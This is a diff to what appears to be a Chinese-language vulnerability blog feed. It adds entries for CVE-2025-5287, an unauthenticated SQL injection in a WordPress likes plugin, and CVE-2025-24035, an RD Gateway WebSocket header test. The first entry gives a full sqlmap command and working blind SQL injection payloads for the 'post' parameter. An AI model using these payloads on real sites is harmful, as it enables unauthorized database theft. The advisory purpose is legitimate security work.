@@ -4,6 +4,60 @@
   
   
   <entry>
+    <title>Likes and Dislikes Plugin SQL注入漏洞</title>
+    <link href="/2025/06/12/github_690042296/"/>
+    <url>/2025/06/12/github_690042296/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Likes and Dislikes Plugin SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5287</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> WordPress的Likes and Dislikes Plugin插件在1.0.0及之前版本中，由于对用户提供的’post’参数转义不足以及现有SQL查询准备不充分，存在SQL注入漏洞。这使得未经认证的攻击者可以向现有查询中附加额外的SQL查询，从而用于从数据库中提取敏感信息。</p><p><strong>产品厂商：</strong> WordPress</p><p><strong>产品名称：</strong> Likes and Dislikes Plugin</p><p><strong>影响版本：</strong> &lt;&#x3D; 1.0.0</p><p><strong>来源：</strong> <a href="https://github.com/RandomRobbieBF/CVE-2025-5287">https://github.com/RandomRobbieBF/CVE-2025-5287</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-5287"><a href="#CVE-2025-5287" class="headerlink" title="CVE-2025-5287"></a>CVE-2025-5287</h2><p>Likes and Dislikes Plugin &lt;&#x3D; 1.0.0 - Unauthenticated SQL Injection</p><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The Likes and Dislikes Plugin plugin for WordPress is vulnerable to SQL Injection via the ‘post’ parameter in all versions up to, and including, 1.0.0 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.  This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.</p><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><ul><li><strong>Type</strong>: plugin</li><li><strong>Slug</strong>: inprosysmedia-likes-dislikes-post</li><li><strong>Affected Version</strong>: 1.0.0</li><li><strong>CVSS Score</strong>: 7.5</li><li><strong>CVSS Rating</strong>: High</li><li><strong>CVSS Vector</strong>: CVSS:3.1&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:U&#x2F;C:H&#x2F;I:N&#x2F;A:N</li><li><strong>CVE</strong>: CVE-2025-5287</li><li><strong>Status</strong>: Closed</li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&#x27;http://kubernetes.docker.internal:8999/wp-admin/admin-ajax.php&#x27;</span> <span class="hljs-attr">--data</span>=<span class="hljs-string">&#x27;action=my_likes_dislikes_action&amp;post=1&amp;state=dislike&#x27;</span> <span class="hljs-attr">--level</span>=<span class="hljs-number">2</span> <span class="hljs-attr">--risk</span>=<span class="hljs-number">2</span> <span class="hljs-attr">--dbms</span>=<span class="hljs-string">&#x27;MySQL&#x27;</span> -<span class="hljs-selector-tag">p</span> post <span class="hljs-attr">--random-agent</span><br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">sqlmap identified the following injection point(s) with a total of 372 HTTP(s) requests:</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">Parameter:</span> <span class="hljs-string">post</span> <span class="hljs-string">(POST)</span><br>    <span class="hljs-attr">Type:</span> <span class="hljs-string">boolean-based</span> <span class="hljs-string">blind</span><br>    <span class="hljs-attr">Title:</span> <span class="hljs-string">AND</span> <span class="hljs-string">boolean-based</span> <span class="hljs-string">blind</span> <span class="hljs-bullet">-</span> <span class="hljs-string">WHERE</span> <span class="hljs-string">or</span> <span class="hljs-string">HAVING</span> <span class="hljs-string">clause</span> <span class="hljs-string">(subquery</span> <span class="hljs-bullet">-</span> <span class="hljs-string">comment)</span><br>    <span class="hljs-attr">Payload:</span> <span class="hljs-string">action=my_likes_dislikes_action&amp;post=1</span> <span class="hljs-string">AND</span> <span class="hljs-number">8197</span><span class="hljs-string">=(SELECT</span> <span class="hljs-string">(CASE</span> <span class="hljs-string">WHEN</span> <span class="hljs-string">(8197=8197)</span> <span class="hljs-string">THEN</span> <span class="hljs-number">8197 </span><span class="hljs-string">ELSE</span> <span class="hljs-string">(SELECT</span> <span class="hljs-number">7036 </span><span class="hljs-string">UNION</span> <span class="hljs-string">SELECT</span> <span class="hljs-number">3343</span><span class="hljs-string">)</span> <span class="hljs-string">END))--</span> <span class="hljs-string">-&amp;state=dislike</span><br><br>    <span class="hljs-attr">Type:</span> <span class="hljs-string">time-based</span> <span class="hljs-string">blind</span><br>    <span class="hljs-attr">Title:</span> <span class="hljs-string">MySQL</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">5.0</span><span class="hljs-number">.12</span> <span class="hljs-string">AND</span> <span class="hljs-string">time-based</span> <span class="hljs-string">blind</span> <span class="hljs-string">(query</span> <span class="hljs-string">SLEEP)</span><br>    <span class="hljs-attr">Payload:</span> <span class="hljs-string">action=my_likes_dislikes_action&amp;post=1</span> <span class="hljs-string">AND</span> <span class="hljs-string">(SELECT</span> <span class="hljs-number">7318 </span><span class="hljs-string">FROM</span> <span class="hljs-string">(SELECT(SLEEP(5)))OIPg)&amp;state=dislike</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CVE-2025:github search</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>RD Gateway WebSocket 处理漏洞</title>
+    <link href="/2025/06/12/github_2263696199/"/>
+    <url>/2025/06/12/github_2263696199/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> RD Gateway WebSocket 处理漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-24035</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 这是一个针对CVE-2025-24035的安全模拟测试，用于测试RD Gateway WebSocket处理超大头部的能力。此脚本仅用于教育目的，在安全的实验室环境中使用。</p><p><strong>产品名称：</strong> RD Gateway</p><p><strong>来源：</strong> <a href="https://github.com/MSeymenD/cve-2025-24035-rds-websocket-dos-test">https://github.com/MSeymenD/cve-2025-24035-rds-websocket-dos-test</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>LICENSE</li><li>README.md</li><li>test_abnormal_rds_websocket.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-24035-WebSocket-Stress-Test-Safe"><a href="#CVE-2025-24035-WebSocket-Stress-Test-Safe" class="headerlink" title="CVE-2025-24035 WebSocket Stress Test (Safe)"></a>CVE-2025-24035 WebSocket Stress Test (Safe)</h2><p>🚨 <strong>DISCLAIMER</strong>: This is NOT an exploit. This script is a simulation and should only be used for educational purposes in a safe lab environment.</p><h3 id="Purpose"><a href="#Purpose" class="headerlink" title="Purpose"></a>Purpose</h3><p>This test sends a deliberately oversized WebSocket header to simulate a malformed request toward RD Gateway services (such as those affected by CVE-2025-24035).</p><h3 id="Legal"><a href="#Legal" class="headerlink" title="Legal"></a>Legal</h3><p>⚠️ Do not use this against systems without explicit authorization. Unauthorized use may be illegal.</p><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 test_abnormal_rds_websocket.py<br></code></pre></td></tr></table></figure><p>Edit the IP address in the script according to your local lab setup.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CVE-2025:github search</tag>
+      
+      <tag>其他</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>HyperComments 未授权任意选项更新漏洞</title>
     <link href="/2025/06/12/github_1646945798/"/>
     <url>/2025/06/12/github_1646945798/</url>
